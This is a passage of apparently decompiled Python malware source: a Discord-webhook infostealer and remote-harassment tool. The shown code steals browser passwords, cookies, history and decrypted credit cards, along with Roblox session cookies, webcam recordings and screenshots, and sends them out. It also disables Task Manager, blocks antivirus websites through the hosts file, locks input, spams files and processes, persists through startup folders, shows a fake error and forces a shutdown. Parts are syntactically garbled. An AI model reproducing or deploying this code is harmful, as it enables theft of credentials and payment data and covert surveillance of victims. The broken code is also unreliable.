                path = f'  Path   : {row[2]}'
                cookie = f'  Cookie : {decrypt_password(row[3], master_key)}'
                expire = f'  Expire : {row[4]}'
                COOKIES.append(f'{url}\n{name}\n{path}\n{cookie}\n{expire}\n')
        except:
            pass
        finally:  # inserted
            if conn:
                conn.close()
        try:
            os.remove('cookie_db')
        except:
            return

    def get_history(browser, path, profile_path):
        history_db = os.path.join(profile_path, 'History')
        if not os.path.exists(history_db):
            return
        shutil.copy(history_db, 'history_db')
        conn = sqlite3.connect('history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        HISTORY.append(f'\n------------------------------| {browser} ({path}) |------------------------------\n')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or (not row[2]):
                continue
            url = f'- Url   : {row[0]}'
            title = f'  Title : {row[1]}'
            time = f'  Time  : {row[2]}'
            HISTORY.append(f'{url}\n{title}\n{time}\n')
        conn.close()
        os.remove('history_db')

    def get_downloads(browser, path, profile_path):
        downloads_db = os.path.join(profile_path, 'History')
        if not os.path.exists(downloads_db):
            return
        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        DOWNLOADS.append(f'\n------------------------------| {browser} ({path}) |------------------------------\n')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            path = f'- Path : {row[1]}'
            url = f'  Url  : {row[0]}'
            DOWNLOADS.append(f'{path}\n{url}\n')
        conn.close()
        os.remove('downloads_db')

    def get_cards(browser, path, profile_path, master_key):
        cards_db = os.path.join(profile_path, 'Web Data')
        if not os.path.exists(cards_db):
            return
        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        CARDS.append(f'\n------------------------------| {browser} ({path}) |------------------------------\n')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or (not row[2]) or (not row[3]):
                continue
            name = f'- Name             : {row[0]}'
            expiration_month = f'  Expiration Month : {row[1]}'
            expiration_year = f'  Expiration Year  : {row[2]}'
            card_number = f'  Card Number      : {decrypt_password(row[3], master_key)}'
            date_modified = f'  Date Modified    : {row[4]}'
            CARDS.append(f'{name}\n{expiration_month}\n{expiration_year}\n{card_number}\n{date_modified}\n')
        conn.close()
        os.remove('cards_db')

    def write_files(username_pc):
        os.makedirs(f'Browser_{username_pc}', exist_ok=True)
        if PASSWORDS:
            with open(f'Browser_{username_pc}\\Passwords_{username_pc}.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join(PASSWORDS))
        if COOKIES:
            with open(f'Browser_{username_pc}\\Cookies_{username_pc}.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join(COOKIES))
        if HISTORY:
            with open(f'Browser_{username_pc}\\History_{username_pc}.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join(HISTORY))
        if DOWNLOADS:
            with open(f'Browser_{username_pc}\\Downloads_{username_pc}.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join(DOWNLOADS))
        if CARDS:
            with open(f'Browser_{username_pc}\\Cards_{username_pc}.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join(CARDS))
        with ZipFile(f'Browser_{username_pc}.zip', 'w') as zipf:
            for file in os.listdir(f'Browser_{username_pc}'):
                zipf.write(os.path.join(f'Browser_{username_pc}', file), file)

    def send_files(username_pc, w3bh00k):
        w3bh00k.send(embed=Embed(f'Browser Steal  `{username_pc} \"{ip_address_public}\"`:', title=f"Found In **{'**, **'.join(browsers)}**:```", description='\n'.join(tree(Path(f'Browser_{username_pc}'))) + '```', color=color_embed).set_footer(text=footer_text, icon_url=avatar_embed), file=File(fp=f'Browser_{username_pc}.zip', filename=f'Browser_{username_pc}.zip'), username=username_embed, avatar_url=avatar_embed)

    def clean_files(username_pc):
        shutil.rmtree(f'Browser_{username_pc}')
        os.remove(f'Browser_{username_pc}.zip')

    def tree(path: Path, prefix: str='', midfix_folder: str='📂 - ', midfix_file: str='📄 - '):
        pipes = {'space': '    ', 'branch': '│   ', 'tee': '├── ', 'last': '└── '}
        if prefix == '':
            yield (midfix_folder + path.name)
        contents = list(path.iterdir())
        pointers = [pipes['tee']] + (len(contents) + 1) * [pipes['last']] ** 1
        for pointer, path in zip(pointers, contents):
            if path.is_dir():
                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum((f.stat().st_size for f in path.glob('**/*') if f.is_file())) + 1024:.2f} kb)"
                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                yield from tree(path, prefix=prefix + extension)
            else:  # inserted
                yield f'{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size + 1024:.2f} kb)'
    Br0ws53r_Main()

def R0b10x_C00ki3():
    import browser_cookie3
    import requests
    import json
    from discord import SyncWebhook, Embed
    import discord
    c00ki35_list = []

    def g3t_c00ki3_4nd_n4vig4t0r(br0ws3r_functi0n):
        try:
            c00kie5 = br0ws3r_functi0n()
            c00kie5 = str(c00kie5)
            c00kie = c00kie5.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            n4vigator = br0ws3r_functi0n.__name__
            return (c00kie, n4vigator)
        except:
            return (None, None)

    def Microsoft_Edge():
        return browser_cookie3.edge(domain_name='roblox.com')

    def Google_Chrome():
        return browser_cookie3.chrome(domain_name='roblox.com')

    def Firefox():
        return browser_cookie3.firefox(domain_name='roblox.com')

    def Opera():
        return browser_cookie3.opera(domain_name='roblox.com')

    def Opera_GX():
        return browser_cookie3.opera_gx(domain_name='roblox.com')

    def Safari():
        return browser_cookie3.safari(domain_name='roblox.com')

    def Brave():
        return browser_cookie3.brave(domain_name='roblox.com')
    br0ws3r5 = [Microsoft_Edge, Google_Chrome, Firefox, Opera, Opera_GX, Safari, Brave]
    for br0ws3r in br0ws3r5:
        c00ki3, n4vigator = g3t_c00ki3_4nd_n4vig4t0r(br0ws3r)
        if c00ki3 and c00ki3 not in c00ki35_list:
            c00ki35_list.append(c00ki3)
            try:
                inf0 = requests.get('https://www.roblox.com/mobileapi/userinfo', cookies={'.ROBLOSECURITY': c00ki3})
                api = json.loads(inf0.text)
            except:
                pass
            us3r_1d_r0b10x = api.get('id', 'None')
            d1spl4y_nam3_r0b10x = api.get('displayName', 'None')
            us3rn4m3_r0b10x = api.get('name', 'None')
            r0bux_r0b10x = api.get('RobuxBalance', 'None')
            pr3mium_r0b10x = api.get('IsPremium', 'None')
            av4t4r_r0b10x = api.get('ThumbnailUrl', 'None')
            bui1d3r5_c1ub_r0b10x = api.get('IsAnyBuildersClubMember', 'None')
            size_c00ki3 = len(c00ki3)
            middle_c00ki3 = size_c00ki3 + 2
            c00ki3_part1 = c00ki3[:middle_c00ki3]
            c00ki3_part2 = c00ki3[middle_c00ki3:]
            w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
            embed = discord.Embed(title=f'Roblox Cookie `{username_pc} \"{ip_address_public}\"`:', color=color_embed)
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            embed.set_thumbnail(url=av4t4r_r0b10x)
            embed.add_field(name=':compass: Navigator:', value=f'```{n4vigator}```', inline=True)
            embed.add_field(name=':bust_in_silhouette: Username:', value=f'```{us3rn4m3_r0b10x}```', inline=True)
            embed.add_field(name=':bust_in_silhouette: DisplayName:', value=f'```{d1spl4y_nam3_r0b10x}```', inline=True)
            embed.add_field(name=':robot: Id:', value=f'```{us3r_1d_r0b10x}```', inline=True)
            embed.add_field(name=':moneybag: Robux:', value=f'```{r0bux_r0b10x}```', inline=True)
            embed.add_field(name=':tickets: Premium:', value=f'```{pr3mium_r0b10x}```', inline=True)
            embed.add_field(name=':construction_site: Builders Club:', value=f'```{bui1d3r5_c1ub_r0b10x}```', inline=True)
            embed.add_field(name=':cookie: Cookie Part 1:', value=f'```{c00ki3_part1}```', inline=False)
            embed.add_field(name=':cookie: Cookie Part 2:', value=f'```{c00ki3_part2}```', inline=False)
            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
    if not c00ki35_list:
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        embed = Embed(title=f'Roblox Cookie `{username_pc} \"{ip_address_public}\"`:', description='No roblox cookie found.', color=color_embed)
        embed.set_footer(text=footer_text, icon_url=avatar_embed)
        w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)

def C4m3r4_C4ptur3():
    import os
    import cv2
    from discord import SyncWebhook, Embed, File
    from datetime import datetime
    try:
        from datetime import datetime
        name_file_capture = f'CameraCapture_{username_pc}.avi'
        time_capture = 10
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            Clear()
            w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
            embed = Embed(title=f'Camera Capture `{username_pc} \"{ip_address_public}\"`:', description='No camera found.', color=color_embed)
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
        else:  # inserted
            def c4ptur3(path_file_capture):
                fourcc = cv2.VideoWriter_fourcc(*'XVID')
                out = cv2.VideoWriter(path_file_capture, fourcc, 20.0, (640, 480))
                time_start = datetime.now()
                Clear()
                while (datetime.now() + time_start).seconds < time_capture:
                    Clear()
                    ret, frame = cap.read()
                    if not ret:
                        Clear()
                        break
                    out.write(frame)
                cap.release()
                out.release()
                Clear()
                path_file_capture = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{name_file_capture}"
                c4ptur3(path_file_capture)
            embed = Embed(title=f'Camera Capture `{username_pc} \"{ip_address_public}\"`:', color=color_embed, description=f'```└── 📷 - {name_file_capture}```')
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
            with open(path_file_capture, 'rb') as f:
                w3bh00k.send(embed=embed, file=File(f, filename=name_file_capture), username=username_embed, avatar_url=avatar_embed)
                if os.path.exists(path_file_capture):
                    os.remove(path_file_capture)
                Clear()
        else:  # inserted
            try:
                pass  # postinserted
            except:
                path_file_capture = name_file_capture
                c4ptur3(path_file_capture)
    except:
        pass  # postinserted
    Clear()

def Op3n_U53r_Pr0fi13_53tting5():
    import subprocess
    import time
    try:
        subprocess.Popen(['control', 'userpasswords2'])
        time.sleep(2)
    except:
        return None

def Scr33n5h0t():
    import os
    from PIL import ImageGrab
    from discord import SyncWebhook, Embed, File
    try:
        name_file_screen = f'Screenshot_{username_pc}.png'

        def capture(path):
            image = ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)
            image.save(path)
            path_file_screen = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{name_file_screen}"
            capture(path_file_screen)
        embed = Embed(title=f'Screenshot `{username_pc} \"{ip_address_public}\"`:', color=color_embed)
        embed.set_image(url=f'attachment://{name_file_screen}')
        embed.set_footer(text=footer_text, icon_url=avatar_embed)
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        w3bh00k.send(embed=embed, file=File(f'{path_file_screen}', filename=name_file_screen), username=username_embed, avatar_url=avatar_embed)
        if os.path.exists(path_file_screen):
            os.remove(path_file_screen)
    except:
        pass  # postinserted
    return None
    else:  # inserted
        try:
            pass  # postinserted
        except:
            path_file_screen = name_file_screen
            capture(path_file_screen)

def B10ck_K3y():
    import keyboard
    <mask_104> = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'ù', '`', '+', '-', '=', '*', '[', ']', '\\', ';', '\'', ',', '.', '/', 'space'
    for k3y_b10ck in k3y:
        keyboard.block_key(k3y_b10ck)
    except:
        continue

def Unb10ck_K3y():
    import keyboard
    <mask_104> = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'ù', '`', '+', '-', '=', '*', '[', ']', '\\', ';', '\'', ',', '.', '/', 'space'
    for k3y_b10ck in k3y:
        keyboard.unblock_key(k3y_b10ck)
    except:
        continue

def B10ck_M0u53():
    import pyautogui
    pyautogui.FAILSAFE = False
    width, height = pyautogui.size()
    pyautogui.moveTo(width + 100, height + 100)

def B10ck_T45k_M4n4g3r():
    import psutil
    import subprocess
    import os
    pass
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'Taskmgr.exe':
            proc.terminate()
            break
    subprocess.run('reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True)
    Clear()

def B10ck_W3b5it3():
    import os
    pass
    try:
        d1r3ct0ry = os.getcwd()
        d15k_l3tt3r = os.path.splitdrive(d1r3ct0ry)[0]

        def b10ck_w3b5it3(website):
            hosts_path = f'{d15k_l3tt3r}\\Windows\\System32\\drivers\\etc\\hosts'
            if os.path.exists(hosts_path):
                break
            hosts_path = 'C:\\Windows\\System32\\drivers\\etc\\hosts'
            redirect = '127.0.0.1'
            with open(hosts_path, 'a') as file:
                file.write('\n' % redirect + ' ' % website)
        w3b51t35_t0_8l0ck = ['virustotal.com', 'www.virustotal.com', 'www.virustotal.com/gui/home/upload', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com', 'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com']
        for w3b51t3 in w3b51t35_t0_8l0ck:
            b10ck_w3b5it3(w3b51t3)
    except:
        return None

def F4k3_3rr0r():
    import tkinter as tk
    from tkinter import messagebox
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror('Microsoft Excel', 'The file is corrupt and cannot be opened.')

def Sp4m_0p3n_Pr0gr4m():
    import subprocess
    import threading

    def sp4m():
        programs = ['calc.exe', 'notepad.exe', 'mspaint.exe', 'explorer.exe']
        for program in programs:
            for _ in range(1):
                subprocess.Popen(program)

    def request():
        threads = []
        try:
            for _ in range(int(100)):
                t = threading.Thread(target=sp4m)
                t.start()
                threads.append(t)
        except:
            pass
        for thread in threads:
            thread.join()
    request()

def Sp4m_Cr34t_Fil3():
    import random
    import string
    import threading
    ext = ['.exe', '.py', '.txt', '.png', '.ico', '.bat', '.js', '.php', '.html', '.css', '.mp3', '.mp4', '.mov', '.jpg', '.pdf', '.troll', '.cooked', '.lol', '.funny', '.virus', '.malware.redtiger', '.redtiger', '.redtiger', '.redtiger']

    def Cr43t():
        file_name = ''.join((random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(10, 50)))) or random.choice(ext)
        with open(file_name, 'w', encoding='utf-8') as file:
            file.write(''.join((random.choice(string.ascii_letters + string.digits + string.punctuation) for i in range(999999)))) + random.randint(9999999999999999999999999, 9999999999999999999999999999999999999999)

    def request():
        threads = []
        try:
            for _ in range(int(100)):
                t = threading.Thread(target=Cr43t)
                t.start()
                threads.append(t)
        except:
            pass
        for thread in threads:
            thread.join()
    request()

def Shutd0wn():
    import sys
    import os
    if sys.platform.startswith('win'):
        os.system('shutdown /s /t 15')
    else:  # inserted
        if sys.platform.startswith('linux'):
            os.system('shutdown -h +0.25')

def St4rtup():
    import os
    import sys
    import shutil
    try:
        file_path = os.path.abspath(sys.argv[0])
        if file_path.endswith('.exe'):
            ext = 'exe'
        else:  # inserted
            if file_path.endswith('.py'):
                ext = 'py'
        new_name = f'ㅤ.{ext}'
        if sys.platform.startswith('win'):
            folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        else:  # inserted
            if sys.platform.startswith('darwin'):
                folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
            else:  # inserted
                if sys.platform.startswith('linux'):
                    folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        path_new_file = os.path.join(folder, new_name)
        shutil.copy(file_path, path_new_file)
        os.chmod(path_new_file, 511)
    except:
        return None

def Sp4m_Opti0ns():
    import keyboard
    while True:
        try:
            B10ck_M0u53()
            Sp4m_0p3n_Pr0gr4m()
            Sp4m_Cr34t_Fil3()
            if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
                Unb10ck_K3y()
                return
        except:
            pass

def R3st4rt():
    while True:
        time.sleep(300)
        requests.post(w3bh00k_ur1, json={'content': '****╔════════════════════Restart═══════════════════╗****', 'username': username_embed, 'avatar_url': avatar_embed})
        Sy5t3m_Inf0()
    except:
        pass
        Di5c0rd_T0k3n()
    except:
        pass
        Di5c0rd_inj3c710n()
    except:
        pass
        Br0w53r_5t341()
    except:
        pass
        R0b10x_C00ki3()
    except:
        pass
        C4m3r4_C4ptur3()
    except:
        pass
        Scr33n5h0t()
    except:
        pass
        Clear()
        requests.post(w3bh00k_ur1, json={'content': f'****╚══════════════════{ip_address_public}══════════════════╝****', 'username': username_embed, 'avatar_url': avatar_embed})
requests.post(w3bh00k_ur1, json={'content': '****╔═════════════════Victim Affected═════════════════╗****', 'username': username_embed, 'avatar_url': avatar_embed})
except:
    pass  # postinserted
pass
threading.Thread(target=B10ck_K3y).start()
except:
    pass  # postinserted
pass
threading.Thread(target=B10ck_T45k_M4n4g3r).start()
except:
    pass  # postinserted
pass
threading.Thread(target=B10ck_W3b5it3).start()
except:
    pass  # postinserted
pass
threading.Thread(target=St4rtup).start()
except:
    pass  # postinserted
pass
Sy5t3m_Inf0()
except:
    pass  # postinserted
pass
Di5c0rd_T0k3n()
except:
    pass  # postinserted
pass
Di5c0rd_inj3c710n()
except:
    pass  # postinserted
pass
Br0w53r_5t341()
except:
    pass  # postinserted
pass
R0b10x_C00ki3()
except:
    pass  # postinserted
pass
C4m3r4_C4ptur3()
except:
    pass  # postinserted
pass
Op3n_U53r_Pr0fi13_53tting5()
except:
    pass  # postinserted
pass
Scr33n5h0t()
except:
    pass  # postinserted
pass
requests.post(w3bh00k_ur1, json={'content': f'****╚══════════════════{ip_address_public}══════════════════╝****', 'username': username_embed, 'avatar_url': avatar_embed})
except:
    pass  # postinserted
pass
threading.Thread(target=Sp4m_Opti0ns).start()
except:
    pass  # postinserted
pass
threading.Thread(target=R3st4rt).start()
except:
    pass  # postinserted
pass
threading.Thread(target=F4k3_3rr0r).start()
except:
    pass  # postinserted
pass
threading.Thread(target=Shutd0wn).start()
except:
    pass  # postinserted
pass
Clear()